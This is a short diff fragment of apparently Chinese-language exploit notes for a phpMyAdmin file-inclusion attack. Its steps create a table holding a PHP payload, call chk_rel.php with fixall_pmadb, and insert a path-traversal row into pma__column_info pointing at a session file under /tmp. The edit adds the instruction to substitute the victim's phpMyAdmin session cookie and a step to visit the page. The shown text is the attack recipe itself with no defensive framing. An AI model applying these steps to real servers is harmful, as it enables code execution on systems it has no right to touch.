@@ -34,9 +34,10 @@ CREATE TABLE foo.bar ( baz VARCHAR(100) PRIMARY KEY );
 INSERT INTO foo.bar SELECT ‘<?php phpinfo(); ?>’;
 #访问
 /chk_rel.php?fixall_pmadb=1&db=foo
-#执行SQL，注意这里***
+#执行SQL，注意这里***换成phpmyadmin的cookie
 INSERT INTO `pma__column_info`SELECT '1', 'foo', 'bar', 'baz', 'plop',
 'plop', 'plop', 'plop',
 '../../../../../../../../tmp/sess_***','plop';
+#访问
 ```
 
